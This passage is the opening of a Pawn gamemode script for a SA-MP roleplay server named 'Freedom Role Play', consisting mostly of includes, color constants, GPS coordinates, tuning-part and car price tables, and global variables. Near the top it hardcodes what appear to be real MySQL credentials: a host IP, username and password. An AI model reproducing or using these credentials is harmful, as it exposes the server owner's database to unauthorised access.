AntiDeAMX2()
{
	new a[][] =
	{
		"Unarmed (Fist)",
		"Brass K"
	};
	#pragma unused a
}

//==================Инклуды========================
#tryinclude 	<samprp>
#include 		<mxdate>
#include 		<crashdetect>
#include 		<Timestamp>
#include        <TOTP>
#include        <nex-ac>
#include        <mxINI>
//==========================================
#if defined MAX_PLAYERS
#undef MAX_PLAYERS
#define MAX_PLAYERS 100 // (ОБЯЗАТЕЛЬНО изменяете на своё количество слотов, а именно, если у вас 50, то ставьте 50, если 150, ставьте 150!)
#else
#define MAX_PLAYERS 100 // (ОБЯЗАТЕЛЬНО изменяете на своё количество слотов, а именно, если у вас 50, то ставьте 50, если 150, ставьте 150!)
#endif
#define SCM SendClientMessage
new format_string[128];
#define SendMes(%0,%1,%2,%3)    format(format_string, sizeof(format_string),%2,%3) && SCM(%0, %1, format_string)
#define MainMenu "[1] Настройки\n[2] Статистика персонажа\n[3] Команды сервера\n{FFFF00}[4] Задать вопрос по игре\n{FFFFFF}[5] Репорт\n[6] Смена пароля\n[7] Очистить чат\n[8] Правила\n[9] Слив денег\n[10] Безопасность\n[11] Смена ника\n[12] Донат\n[13] Бонусы"
//==========================================
new bool:SERVERTEST = false;
new 	QUERY[4096];
new     DATABASE;
//==========================================
#define 	FullServName 		"Freedom Role Play"
#define 	NameServer 			"Freedom-RP" //
#define 	NameSite 			"frp.Ru" //
#define 	HostName 			"Freedom Role Play" //
#define 	Mode 				"Freedom-RP CIS" //
#define     NumberServer        "01" //
#define     version				"0.0.1"
//==========================================
#define 	SQL_HOST "188.127.241.201"
#define 	SQL_USER "gs97685"
#define 	SQL_PASS "VPjunApnaz"
#define 	SQL_BASE "gs97685"
//==========================================
new ActorsRob[30];
new bool:cdrob[10];
new robscdtimer[MAX_PLAYERS];
new PlayerText:robsdraw[MAX_PLAYERS];
new RobTickRTC[MAX_PLAYERS];
new RobInts[MAX_PLAYERS];
//==========================================
#define 	TABLE_ACCOUNTS  	"accounts"
#define 	TABLE_ADMIN 		"admin"
#define 	TABLE_OTHERS 		"others"
#define 	TABLE_CASINO 		"casino"
#define 	TABLE_BANIP     	"banip"
#define 	TABLE_BIZZ      	"bizz"
#define 	TABLE_WORKSHOPS 	"workshops"
#define 	TABLE_HOUSE     	"house"
#define 	TABLE_KVARTIRS  	"kvart"
#define 	TABLE_PODEZDS  		"podezd"
#define 	TABLE_ATM       	"atm"
#define 	TABLE_BAN       	"ban"
#define 	TABLE_FARM      	"farms"
#define 	TABLE_STALL     	"stall"
#define 	TABLE_GANGZONE  	"gangzone"
#define 	TABLE_CARS      	"cars"
//==========================================
#define 	publics:%0(%1)			forward %0(%1); public %0(%1)
#define 	DIALOG_STYLE_MSGBOX 	0
#define 	DIALOG_STYLE_INPUT 		1
#define 	DIALOG_STYLE_LIST 		2
#define 	DIALOG_STYLE_PASSWORD 	3
#define 	NUMBER_OF_ARMYTRUCKS   	7
#define 	Ammo_SDPISTOL 			10
#define 	Ammo_DEAGLE 			7
#define 	Ammo_SHOTGUN			5
#define 	Ammo_MP5				25
#define 	Ammo_AK47				35
#define 	Ammo_M4A1				35
#define 	KEY_AIM 				128
#define 	TAZE_LOSEHP 			0
//==========================================
#define     COLOR_CMD           	0x7AADA8FF
#define 	COLOR_GOLD 				0xEAC700FF
#define 	COLOR_BOX 				0x00000070
#define 	COLOR_BBLUE 			0x20A9FFFF
#define 	COLOR_CLUB 				0x00AFF6AA
#define 	COLOR_ORANGE 			0xFF9900AA
#define 	COLOR_ISPOLZUY 			0x7FB151FF
#define 	COLOR_GRAD1 			0xB4B5B7FF
#define 	COLOR_SINIY 			0x00004FAA
#define 	COLOR_LG 				0x7FFF00FF
#define 	COLOR_BLUE 				0x6ab1ffaa
#define 	COLOR_SALMON 			0xFA8072AA
#define 	COLOR_SYSTEM 			0xEFEFF7AA
#define 	COLOR_KHAKI 			0xF0E68CAA
#define 	COLOR_TEAL 				0x008080FF
#define 	COLOR_GRAD2 			0xBFC0C2FF
#define 	COLOR_INDIGO 			0x4B00B0AA
#define 	COLOR_IVORY 			0xFFFF82AA
#define 	COLOR_TEAL 				0x008080FF
#define 	COLOR_GRAD3 			0xCBCCCEFF
#define 	COLOR_GRAD4 			0xD8D8D8FF
#define 	COLOR_GRAD5 			0xE3E3E3FF
#define 	COLOR_GRAD6 			0xF0F0F0FF
#define 	COLOR_GRAD7 			0xF0F0F0FF
#define 	COLOR_GRAD8 			0xF0F0F0FF
#define 	COLOR_BLACK 			0x000000AA
#define 	COLOR_GREY 				0xAFAFAFAA
#define 	COLOR_GREEN 			0x2cc72caa
#define 	COLOR_BLUEGREEN   		0x46BBAA00
#define 	COLOR_ORANGE 			0xFF9900AA
#define 	COLOR_RED 				0xbc2c2caa
#define 	COLOR_LIGHTRED 			0xFF6347AA
#define 	COLOR_LIGHTBLUE 		0x33CCFFFF
//#define 	COLOR_LLIGHTBLUE 		COLOR_BLUE
#define 	COLOR_LIGHTGREEN 		0x8bb717aa
#define 	COLOR_YELLOW			0xFFFF00FF
#define 	COLOR_YELLOW2 			0xF5DEB3AA
//#define 	COLOR_WHITE 			0xFFFFFFAA
#define 	COLOR_REDD 				0xFF0000AA
#define 	COLOR_BROW 				0xA85400AA
#define 	COLOR_FADE1 			0xE6E6E6E6
#define 	COLOR_FADE2 			0xC8C8C8C8
#define 	COLOR_FADE3 			0xAAAAAAAA
#define 	COLOR_FADE4 			0x8C8C8C8C
#define 	COLOR_FADE5 			0x6E6E6E6E
#define 	COLOR_PURPLE 			0xC2A2DAAA
#define 	COLOR_DBLUE 			0x2641FEAA
#define 	COLOR_ALLDEPT 			0xFF8282AA
#define 	COLOR_NEWS 				0xFFA500AA
#define 	COLOR_OOC 				0xE0FFFFAA
#define 	TEAM_HIT_COLOR 			0xFFFFFF00
#define 	TEAM_BLUE_COLOR 		0x8D8DFF00
#define 	COLOR_ADD 				0x63FF60AA
#define 	TEAM_GROVE_COLOR 		0x00D900C8
#define 	TEAM_VAGOS_COLOR 		0xFFC801C8
#define 	TEAM_BALLAS_COLOR 		0xD900D3C8
#define 	TEAM_AZTECAS_COLOR 		0x01FCFFC8
#define 	TEAM_CYAN_COLOR 		0xFF8282AA
#define 	TEAM_ORANGE_COLOR 		0xFF830000
#define 	COLOR_INVIS 			0xAFAFAF00
#define 	COLOR_SPEC 				0xBFC0C200
#define 	COLOR_STROKA 			0xFD0A9FF
//==========================================
enum gps_Info
{
	gps_t[45],
	Float: gps_x,
	Float: gps_y,
	Float: gps_z
}
new social_info[][gps_Info] = { // Важные места в GPS
{"Мэрия", 1479.6614,-1741.5881,13.5469}, // Меняем
{"Банк SF", -2170.4336,252.5737,35.3351},
{"Автошкола", -2029.6696,-96.3916,35.1641},
{"Fort Carson", -72.8030,1159.6533,19.7422},
{"Приём металла", 2755.9060,-2515.5491,13.6397}, // Меняем
{"Наркопритон", 2182.8240,-1666.7662,14.7032}, // Меняем
{"Аэропорт [SF]", -1549.4977,-438.6559,6.0000},
{"Пляж Santa Maria", 315.2710,-1784.7847,4.6507}, // Меняем
{"Пейнтбол", 2586.3958,2790.0894,10.8203}, // Меняем
{"Церковь", -1982.9703,1115.3318,53.1268}
};
new job_info[][gps_Info] = { // Работы в GPS
{"Склад с алкоголем", -20.6436,-300.6627,5.4229}, //Меняем
{"Нефтезавод", -1028.2332,-596.7050,32.0078},
{"Склад продуктов", -500.6603,-557.4494,25.5234},
{"Склад для урожая с ферм", 1628.4138,2321.3416,10.8130}, // Меняем
{"Автобусный парк", 1634.0817,-1152.8029,23.9063}, // Меняем
{"Стоянка машин Хот догов", -2432.1353,728.1223,35.0156},
{"Работа грузчика", 2228.9771,-2214.3423,13.5469}, // Меняем
{"Склад с наркотиками", 1280.6012,-1328.3436,13.3721}, // Меняем
{"Автоугонщики", 2519.6055,-1463.4926,23.9785} // Меняем
};
new shop_info[][gps_Info] = { // Магазины в GPS
{"Автосалон: Nope", 562.2973,-1291.6454,17.2482},
{"Автосалон: D and C", -1952.2416, 297.8349,35.4688},
{"Автосалон: B and A", 2200.7192,1394.1440,11.0625},
{"Магазин одежды [SF]", -1703.1656,941.8860,24.8906},
{"Оружейный магазин [SF]", -2626.7271,212.4711,4.5982}
};
new frac_info[][gps_Info] = { //Фракции в GPS
{"Мэрия", 1479.6614,-1741.5881,13.5469}, // Меняем
{"Автошкола", -2029.6696,-96.3916,35.1641},
{"Медики", -2662.4089,624.6633,14.4531},
{"Полиция", -1605.5968,719.9384,11.9772},
{"ФБР", -2426.4136,496.5313,30.0703},
{"Военная база [Авианосец]", -1341.7393,475.5054,7.1875},
{"Новости", -2044.7574,462.1444,35.1719},
{"Особняк Yakuza", 1463.7456,2773.4534,10.6719},
{"Особняк Русской мафии", 947.1475,1732.4764,8.8516},
{"Особняк La Coca Nostra", 1444.5669,749.3381,10.8203},
{"Район Grove Street", 2466.5449,-1665.6993,13.4696},
{"Район Vagos", 2795.1541,-1594.1162,10.9269},
{"Район Ballas", 2706.2224,-1997.3385,13.5547},
{"Район Rifa", 2179.1306,-1760.8370,13.5469},
{"Район Aztecas", 1702.7330,-2106.9773,13.5469}
};
new farm_info[][gps_Info] = { // Фермы в GPS
{"Ферма номер: 0", -376.1135,-1410.9020,25.7266},
{"Ферма номер: 1", -113.4650,-3.5923,3.1094},
{"Ферма номер: 2", -1055.0795,-1195.0725,129.0927},
{"Ферма номер: 3", 2.0902,74.6309,3.1172},
{"Ферма номер: 4", 1926.3021,173.4447,37.2813}
};
new trucker_info[][gps_Info] = { // Дальнобойщики в GPS
{"Порт СФ", -1731.3489,118.6924,3.5547},
{"Нефтезавод №1", 256.2961,1414.4734,10.7075},
{"Нефтезавод №2", -1046.8383,-670.5345,32.3516},
{"Склад угля №1", 608.5809,847.9885,-43.1515},
{"Склад угля №2", -1873.1827,-1720.1915,21.7500},
{"Лесопилка №1", -1978.7343,-2434.5264,30.63},
{"Лесопилка №2", -1977.6138,-2442.2051,30.6250},
{"Аренда машин", 2353.2612,2719.6458,10.7217}
};
new bikes_info[][gps_Info] = { // Клуб Байкеров в GPS
{"Hell's Angels MC", 692.6858,-477.6270,16.3359},
{"Pagans MC", -2105.0916,-2490.5391,30.6250},
{"Warlocks MC", 2467.6013,1321.6621,10.7386}
};
new sto_info[][gps_Info] = { // СТО в GPS
{"СТО San Fierro", -1799.2909,1198.1625,25.1194}
};
//======//
new bool:serverRestart = true;
new bool:onlyOneIp = false;
new slit;
forward Float:GetDistanceBetweenPlayers(p1,p2);
forward Float:GetDistanceBetweenPlayerss(p1,p2);
new derbyrace[3];
//
new googleauth[32][] = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y","Z","2", "3", "4", "5", "6", "7"};
new bool:killed[MAX_PLAYERS];
enum grating
{
	Rifa,
	Grove,
	Ballas,
	Vagos,
	Aztec
};
enum SETTINGS_DATA
{
	CheatSetting[53]
};
new SettingInfo[SETTINGS_DATA];
new textstr[512];
new gRating[grating];
new BestGang;
new limitgang[grating];
new limitmafia[3];
// Циклы
new bool:Goto[MAX_PLAYERS];
new garage_car[MAX_PLAYERS][5];
new TriggerStatus[MAX_PLAYERS];
new Float:TriggerPos[MAX_PLAYERS][3];
new bool:SERVERCARID[MAX_VEHICLES];
enum bikerss
{
	hells,
	warloks,
	pagans,
};
new bool:IsCapted[bikerss];
enum robbing
{
	pickup,
	robCar,
	bikerCar,
	robType,
	bresult
};
new RobbingBiker[robbing];
new Text3D:Rob3DText;
new bool:BikerRobbedBizz[50];
enum bikercapt
{
	atack,
	other,
	reasons,
};
new BikerCapture[bikercapt];
new Text3D:BikerText[MAX_PLAYERS];
new ZoneCaptureBiker;
enum zoneinfo
{
	Float:zoneX1,
	Float:zoneY1,
	Float:zoneX2,
	Float:zoneY2,
};
new BikerZoneCoords[3][zoneinfo];
new BikerZone[3];
new BikerKills[bikercapt];
new bool:GiveMF[MAX_PLAYERS];
new bool:NewTazer[MAX_PLAYERS];
new cuffto[MAX_PLAYERS];
new TimerForPlayer[MAX_PLAYERS];
new Convoi[MAX_PLAYERS];
new AnimTheLost[MAX_PLAYERS];
new rr = 0;
new bool:AutoSaloon[MAX_PLAYERS];
new ZernBuy;
new UrojSell;
new NarkSell;
new bool:boyidet;
new bool:zips[MAX_PLAYERS];
new bool:AGM[MAX_PLAYERS];
new training[MAX_PLAYERS];
new Text:Logotip_TD[10]; // текстдрав логотипа.
new Text:Golod_TD[1]; // текстдрав голода.
new PlayerText:HP_PTD[MAX_PLAYERS][1]; // текстдрав хп
new PlayerText:Golod_PTD[MAX_PLAYERS][1]; // текстдрав голода.
new Text:IntLoad_TD[5]; // прогрузка интерьера взята у Leon'a.
new bool:times[MAX_PLAYERS];
new booston = 0;
enum votes {
	vcaption[32],
	vquestion[100],
	vlevel,
	variants[32],
	vactive
};
enum news {
	sfn,
	lsn,
	lvn
};
new VoteNews[news][10][votes];
enum vars {
	vname[32],
	vnumber
};
new VoteNewsVariants_LS[10][10][vars];
new VoteNewsVariants_SF[10][10][vars];
new VoteNewsVariants_LV[10][10][vars];
new choosebiz[MAX_PLAYERS];
new chooses[MAX_PLAYERS];
new sportfrac;
new Online[MAX_PLAYERS];
new Float:accept_car_damage[MAX_PLAYERS],
Float:last_vehicle_health[MAX_PLAYERS];
new CarOffer[MAX_PLAYERS];
new CarPrice[MAX_PLAYERS];
new BoyOffer[MAX_PLAYERS];
new BoyWin[MAX_PLAYERS];
new togran[MAX_PLAYERS];
new garagexit[4];
new peremennn[MAX_PLAYERS];
new Players[500];
new players;
#define SPD ShowPlayerDialog
#define 	foreach(%0) 			for(new st, %0=Players[st]; st <players; %0=Players[++st])
new monitoring;
enum workshoplistInfo
{
	wlID,
	wlName[MAX_PLAYER_NAME],
};
new WorkshopList[10][5][workshoplistInfo];
#define MAX_VEHICLE_COMPONENT 171
new AwtomasMassiveID[MAX_PLAYERS][MAX_VEHICLE_COMPONENT];
enum AllComponents
{
	idcomp,
	Type[20],
	Name[20],
	Cost
};
new AllTuningComponentsInfo[MAX_VEHICLE_COMPONENT][AllComponents]= {
	{1008,    "Nitro",        "Nos 5x"            ,2000},
	{1009,    "Nitro",        "Nos 2x"            ,1000},
	{1010,    "Nitro",        "Nos 10x"            ,3000},
	{1073,    "Wheels",        "Shadow"            ,5000},
	{1074,    "Wheels",        "Mega"                ,5000},
	{1075,    "Wheels",        "Rimshine"            ,5000},
	{1076,    "Wheels",        "Wires"                ,5000},
	{1077,    "Wheels",        "Classic"            ,5000},
	{1078,    "Wheels",        "Twist"                ,5000},
	{1079,    "Wheels",        "Cutter"            ,5000},
	{1080,    "Wheels",        "Switch"            ,5000},
	{1081,    "Wheels",        "Grove"                ,5000},
	{1082,    "Wheels",        "Import"            ,5000},
	{1083,    "Wheels",        "Dollar"            ,5000},
	{1084,    "Wheels",        "Trance"            ,5000},
	{1085,    "Wheels",        "Atomic"            ,5000},
	{1025,    "Wheels",        "Offroad"            ,5000},
	{1096,    "Wheels",        "Ahab"                ,5000},
	{1097,    "Wheels",        "Virtual"            ,5000},
	{1098,    "Wheels",        "Access"            ,5000},
	{1086,    "Stero",        "Sony"                ,500},
	{1087,    "Hydraulics",    "LowRider"            ,4000},
	{1000,    "Spoiler",    "Pro"                    ,2000},
	{1001,    "Spoiler",    "Win"                    ,2000},
	{1002,    "Spoiler",    "Drag"                    ,2000},
	{1003,    "Spoiler",    "Alpha"                    ,2000},
	{1014,    "Spoiler",    "Champ"                    ,2000},
	{1015,    "Spoiler",    "Race"                    ,2000},
	{1016,    "Spoiler",    "Worx"                    ,2000},
	{1049,    "Spoiler",    "Alien"                    ,2000},
	{1050,    "Spoiler",    "X-Flow"                ,2000},
	{1058,    "Spoiler",    "Alien"                    ,2000},
	{1023,    "Spoiler",    "Fury"                    ,2000},
	{1158,    "Spoiler",    "X-Flow"                ,2000},
	{1146,    "Spoiler",    "X-Flow    "                ,2000},
	{1147,    "Spoiler",    "Alien"                    ,2000},
	{1138,    "Spoiler",    "Alien"                    ,2000},
	{1139,    "Spoiler",    "X-Flow"                ,2000},
	{1060,    "Spoiler",    "X-Flow"                ,2000},
	{1162,    "Spoiler",    "Alien"                    ,2000},
	{1163,    "Spoiler",    "X-Flow"                ,2000},
	{1164,    "Spoiler",    "Alien"                    ,2000},
	{1004,    "Hood",        "Champ Scoop"                ,1000},
	{1005,    "Hood",        "Fury Scoop"                ,1000},
	{1011,    "Hood",        "Race Scoop"                ,1000},
	{1012,    "Hood",        "Worx Scoop"                ,1000},
	{1100,    "Bullbars",    "Chrome Grill"            ,1000},
	{1123,    "Bullbars",    "Chrome Bars"    ,1000},
	{1125,    "Bullbars",    "Chrome Lights"    ,1000},
	{1117,    "Front Bumper","Chrome"                ,2000},
	{1152,    "Front Bumper","X-Flow"                ,2000},
	{1153,    "Front Bumper","Alien"                ,2000},
	{1155,    "Front Bumper","Alien"                ,2000},
	{1157,    "Front Bumper","X-Flow"                ,2000},
	{1160,    "Front Bumper","Alien"                ,2000},
	{1165,    "Front Bumper","X-Flow"                ,2000},
	{1166,    "Front Bumper","Alien"                ,2000},
	{1169,    "Front Bumper","Alien"                ,2000},
	{1170,    "Front Bumper","X-Flow"                ,2000},
	{1171,    "Front Bumper","Alien"                ,2000},
	{1172,    "Front Bumper","X-Flow"                ,2000},
	{1173,    "Front Bumper","X-Flow"                ,2000},
	{1174,    "Front Bumper","Chrome"                ,2000},
	{1176,    "Rear Bumper","Chrome"                ,2000},
	{1179,    "Front Bumper","Chrome"                ,2000},
	{1181,    "Front Bumper","Slamin"                ,2000},
	{1182,    "Front Bumper","Chrome"                ,2000},
	{1185,    "Front Bumper","Slamin"                ,2000},
	{1188,    "Front Bumper","Slamin"                ,2000},
	{1189,    "Front Bumper","Chrome"                ,2000},
	{1190,    "Front Bumper","Slamin"                ,2000},
	{1191,    "Front Bumper","Chrome"                ,2000},
	{1140,    "Rear Bumper","X-Flow"                ,2000},
	{1141,    "Rear Bumper","Alien"                ,2000},
	{1148,    "Rear Bumper","X-Flow"                ,2000},
	{1149,    "Rear Bumper","Alien"                ,2000},
	{1150,    "Rear Bumper","Alien"                ,2000},
	{1151,    "Rear Bumper","X-Flow"                ,2000},
	{1154,    "Rear Bumper","Alien"                ,2000},
	{1156,    "Rear Bumper","X-Flow"                ,2000},
	{1159,    "Rear Bumper","Alien"                ,2000},
	{1161,    "Rear Bumper","X-Flow"                ,2000},
	{1167,    "Rear Bumper","X-Flow"                ,2000},
	{1168,    "Rear Bumper","Alien"                ,2000},
	{1175,    "Rear Bumper","Slamin"                ,2000},
	{1177,    "Rear Bumper","Slamin"                ,2000},
	{1178,    "Rear Bumper","Slamin"                ,2000},
	{1180,    "Rear Bumper","Chrome"                ,2000},
	{1183,    "Rear Bumper","Slamin"                ,2000},
	{1184,    "Rear Bumper","Chrome"                ,2000},
	{1186,    "Rear Bumper","Slamin"                ,2000},
	{1187,    "Rear Bumper","Chrome"                ,2000},
	{1192,    "Rear Bumper","Chrome"                ,2000},
	{1193,    "Rear Bumper","Slamin"                ,2000},
	{1143,    "Vents",    "Oval"            ,1000},
	{1145,    "Vents",    "Square"        ,1000},
	{1032,    "Roof",        "Alien"            ,2000},
	{1006,    "Roof",        "Scoop"                ,2000},
	{1038,    "Roof",        "Alien"            ,2000},
	{1035,    "Roof",        "X-Flow"            ,2000},
	{1033,    "Roof",        "X-Flow"            ,2000},
	{1053,    "Roof",        "X-Flow"                    ,2000},
	{1054,    "Roof",        "Alien"                        ,2000},
	{1055,    "Roof",        "Alien"                        ,2000},
	{1061,    "Roof",        "X-Flow"                    ,2000},
	{1067,    "Roof",        "Alien"                        ,2000},
	{1068,    "Roof",        "X-Flow"                    ,2000},
	{1088,    "Roof",        "Alien"                        ,2000},
	{1091,    "Roof",        "X-Flow"                    ,2000},
	{1103,    "Roof",        "Covertible"                ,2000},
	{1128,    "Roof",        "Vinyl Hardtop"                ,2000},
	{1130,    "Roof",        "Hardtop"                    ,2000},
	{1131,    "Roof",        "Softtop"                    ,2000},
	{1013,    "Lamps",        "Round Fog"                    ,1000},
	{1024,    "Lamps",        "Square Fog"                ,1000},
	{1109,    "Rear Bullbars","Chrome"                ,1000},
	{1110,    "Rear Bullbars","Slamin"                ,1000},
	{1115,    "Front Bullbars","Chrome"                ,1000},
	{1116,    "Front Bullbars","Slamin"                ,1000},
	{1018,    "Exhaust",    "Upswept"                    ,2000},
	{1019,    "Exhaust",    "Twin"                        ,2000},
	{1020,    "Exhaust",    "Large"                        ,2000},
	{1021,    "Exhaust",    "Medium"                    ,2000},
	{1022,    "Exhaust",    "Small"                        ,2000},
	{1028,    "Exhaust",    "Alien"                        ,2000},
	{1029,    "Exhaust",    "X-Flow"                    ,2000},
	{1034,    "Exhaust",  "Alien"                        ,2000},
	{1037,    "Exhaust",    "X-Flow"                    ,2000},
	{1043,    "Exhaust",    "Slamin"                    ,2000},
	{1044,    "Exhaust",    "Chrome"                    ,2000},
	{1045,    "Exhaust",    "X-Flow"                    ,2000},
	{1046,    "Exhaust",    "Alien"                        ,2000},
	{1059,    "Exhaust",    "X-Flow"                    ,2000},
	{1064,    "Exhaust",    "Alien"                        ,2000},
	{1065,    "Exhaust",    "Alien"                        ,2000},
	{1066,    "Exhaust",    "X-Flow"                    ,2000},
	{1092,    "Exhaust",    "Alien"                     ,2000},
	{1089,    "Exhaust",    "X-Flow"                    ,2000},
	{1126,    "Exhaust",    "Chrome"            		,2000},
	{1127,    "Exhaust",    "Slamin"            		,2000},
	{1129,    "Exhaust",    "Chrome"                    ,2000},
	{1113,    "Exhaust",    "Chrome"                    ,2000},
	{1114,    "Exhaust",    "Slamin"                    ,2000},
	{1104,    "Exhaust",    "Chrome"                    ,2000},
	{1105,    "Exhaust",    "Slamin"                    ,2000},
	{1132,    "Exhaust",    "Slamin"                    ,2000},
	{1135,    "Exhaust",    "Slamin"                    ,2000},
	{1136,    "Exhaust",    "Chrome"                    ,2000},
	{1007,    "Sideskirt",    "Sideskirt"                ,2000},
	{1026,    "Sideskirt",    "Alien"                    ,2000},
	{1031,    "Sideskirt",    "X-Flow"                ,2000},
	{1036,    "Sideskirt",    "Alien"                    ,2000},
	{1039,    "Sideskirt",    "X-Flow"                ,2000},
	{1041,    "Sideskirt",    "X-Flow"                ,2000},
	{1042,    "Sideskirt",    "Chrome"                ,2000},
	{1047,    "Sideskirt",    "Alien"                    ,2000},
	{1048,    "Sideskirt",    "X-Flow"                ,2000},
	{1056,    "Sideskirt",    "Alien"                    ,2000},
	{1057,    "Sideskirt",    "X-Flow"                ,2000},
	{1069,    "Sideskirt",    "Alien"                    ,2000},
	{1070,    "Sideskirt",    "X-Flow"                ,2000},
	{1090,    "Sideskirt",    "Alien"                    ,2000},
	{1093,    "Sideskirt",    "X-Flow"                ,2000},
	{1095,    "Sideskirt",    "X-Flow"                ,2000},
	{1106,    "Sideskirt",    "Chrome Arches"            ,2000},
	{1108,    "Sideskirt",    "Chrome Strip"            ,2000},
	{1118,    "Sideskirt",    "Chrome Trim"            ,2000},
	{1119,    "Sideskirt",    "Wheelcovers"            ,2000},
	{1122,    "Sideskirt",    "Chrome Flames"            ,2000},
	{1133,    "Sideskirt",    "Chrome Strip"            ,2000},
	{1134,    "Sideskirt",    "Chrome Strip"            ,2000}
};
// Vote
new LPick[20];
new idgols;
enum IGolos
{
	Variant[128],
	Golosov,
};
new Golosovan[10][IGolos];
new Text3D:GLT[20];
enum GG
{
	NameGolos[128],
	bool:goloson,
};
new pickupalla;
new GL2[GG];
// Рулетка
#define MAX_ROULET 13
new bool:RouletPrize[MAX_ROULET];
new RouletNumber[MAX_ROULET];
new RouletKrupie[MAX_ROULET];
new RouletTimer[MAX_ROULET][3];
new bool:RouletPlay[MAX_ROULET];
new PlayerText:RouletText[MAX_PLAYERS];
new RouletCloakroom[2];
//==================================
new OpustitRuki[MAX_PLAYERS];
new ZapretDice[MAX_PLAYERS];
new DiceOffers[MAX_PLAYERS];
new dicetime;
new KostiName[MAX_PLAYERS];
new KostiMoney[MAX_PLAYERS];
// Кости
#define MAX_BONE 14
new Text:Bone[4];
new PlayerText:PlayerBone[MAX_PLAYERS][4];
// Выбор скина
new Text:Select_Skin_TD[7];
new PlayerText:Select_Skin_PTD[MAX_PLAYERS][2];
//
new
Float:BoneCoor[MAX_BONE][4] ={
	{1944.19,1010.90,992.00,90.00},
	{1944.19,1017.70,992.00,90.00},
	{1944.19,1025.00,992.00,90.00},
	{1938.19,1010.90,992.00,90.00},
	{1938.19,1017.70,992.00,90.00},
	{1938.19,1025.00,992.00,90.00},
	{2251.01,1589.78,1005.70,90.00},
	{2257.01,1589.78,1005.70,90.00},
	{2251.01,1595.78,1005.70,90.00},
	{2257.01,1595.78,1005.70,90.00},
	{2266.01,1589.78,1005.70,90.00},
	{2272.01,1589.78,1005.70,90.00},
	{2266.01,1595.78,1005.70,90.00},
	{2272.01,1595.78,1005.70,90.00}
};
enum Bones
{
	Gamer[5],
	Bet,
	bBank,
	Crupie,
	GameStart
}
new BoneInfo[MAX_BONE+1][Bones];

new MaxSpeedCar[212] = {
	87,81,103,-1,73,91,-1,-1,-1,-1,-1,123,93,-1,-1,106,-1,-1,64,82,93,82,82,-1,75,-1,94,-1,
	-1,112,-1,-1,-1,-1,92,-1,85,-1,-1,93,-1,-1,-1,-1,62,90,-1,-1,-1,-1,-1,107,-1,-1,-1,-1,-1,-1,87,-1,-1,88 ,-1,79 ,-1,-1,
	87,87,79,-1,-1,61,-1,-1,82,96,-1,103,75,77,102,-1,-1,-1,-1,-1,-1,-1,-1,77,-1,82,78,-1,119,97,90,-1,-1,-1,-1,-1,119,119,-1,-1,99,92,-1,-1,-1,-1,
	-1,-1,-1,-1,87,87,91,-1,-1,88,115,-1,-1,-1,-1,87,82,-1,82,-1,-1,-1,90,93,87,96,-1,-1,-1,82,112,91,73,-1,81,82,79,-1,85,80,87,-1,-1,84,87,-1,-1,86,98,94,
	85,98,-1,-1,91,88,96,-1,-1,-1,-1,-1,-1,-1,87,87,-1,-1,87,85,88,-1,-1,-1,87,87,91,-1,90,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,82,-1,93,95,87,73,-1
};
enum _spectator
{
	sID,
	SShout[4],
	SAFK[3],
Float:sPos[4],
	sVirt,
	sInt
}
new SERIU[MAX_PLAYERS][_spectator];

new UseSound[MAX_PLAYERS];
new Sounds;
new stream[256];
new Float:rads;
new Float:streampos[3];

new PlayerText:Seriu[MAX_PLAYERS][2];
new
PlayerText:ReconPlayer[35],
ReconBounds[MAX_PLAYERS][2],
ReconSelect[MAX_PLAYERS],
SpecAd[MAX_PLAYERS],
Float:SpecPlayer[MAX_PLAYERS][3],
SpecPlayerInt[MAX_PLAYERS],
SpecPlayerWorld[MAX_PLAYERS],
SpecID[MAX_PLAYERS],
Spectate[MAX_PLAYERS],
NumberShot[MAX_PLAYERS],
DisallowSpawn[MAX_PLAYERS],
TimeNumberShot[MAX_PLAYERS],
NumberShotTarget[MAX_PLAYERS],
TimeNumberShotTarget[MAX_PLAYERS],
Float:SpecPlayerAngle[MAX_PLAYERS],
LastReconClick[MAX_PLAYERS][2],
ReconSelectSub[MAX_PLAYERS];

new Text:AutoShopText[12];
new PlayerText:ShopText[MAX_PLAYERS];

new ShopCar[86][2] =
{
	{400,130000},//n 0
	{567,200000},
	{549,120000},
	{547,110000},
	{546,140000},
	{543,100000},
	{527,100000},
	{526,110000},
	{518,170000},
	{517,150000},
	{516,140000},
	{492,140000},
	{479,110000},
	{478,100000},
	{475,190000},
	{466,110000},
	{458,120000},
	{439,150000},
	{436,100000},
	{404,100000}, //n 19
	{419,800000},//c 20
	{586,800000},
	{581,1000000},
	{461,1000000},
	{418,700000},
	{603,750000},
	{589,770000},
	{580,1000000},
	{579,940000},
	{561,910000},
	{555,940000},
	{554,840000},
	{534,760000},
	{533,920000},
	{505,880000},
	{491,800000},
	{489,880000},
	{445,810000},
	{421,830000},//c 38
	{401,340000},//d 39
	{600,420000},
	{585,360000},
	{576,350000},
	{575,460000},
	{566,340000},
	{551,480000},
	{550,480000},
	{540,330000},
	{536,400000},
	{529,440000},
	{507,450000},
	{474,370000},
	{467,390000},
	{426,420000},
	{422,310000},
	{412,390000},
	{405,400000},//d 56
	{477,2200000},//b 57
	{471,2100000},
	{468,1900000},
	{463,2000000},
	{521,1900000},
	{602,2000000},
	{587,2100000},
	{565,2100000},
	{562,2200000},
	{560,2250000},
	{559,2200000},
	{558,2100000},
	{545,1900000},
	{535,2000000},
	{480,2400000},//b 71
	{402,4800000},//a 72
	{503,6000000},
	{502,6000000},
	{494,6000000},
	{495,5800000},
	{424,5000000},
	{434,4800000},
	{522,4600000},
	{541,6000000},
	{506,5100000},
	{451,6000000},
	{429,5400000},
	{415,5600000},
	{411,6000000}//a 85
};
new spys[5][2] = {
	{-1,-1},
	{-1,-1},
	{-1,-1},
	{-1,-1},
	{-1,-1}
};
new shotTime[MAX_PLAYERS];
new shot[MAX_PLAYERS];

new tipster = -1;
new tipsteron = -1;
new tipsterplayer = -1;
new getgunsid[MAX_PLAYERS];
new tipsterlisten[MAX_PLAYERS];
new vehicleidtp[MAX_PLAYERS];
new reklamatimer;
new PlayerText:FishingText[MAX_PLAYERS];
new Float:Sonar[MAX_PLAYERS];
new ammonac[6];
new skills[2];
new Text3D:LabelRank[MAX_PLAYERS];
new Text3D:LabelRecognition[MAX_PLAYERS];
new LabelOn[MAX_PLAYERS];
new recognition[MAX_PLAYERS];
new enginebrokened[MAX_VEHICLES];
new engine,lights,alarm,doors,bonnet,boot,objective;
new IsSmoking[MAX_PLAYERS];
enum exInfo
{
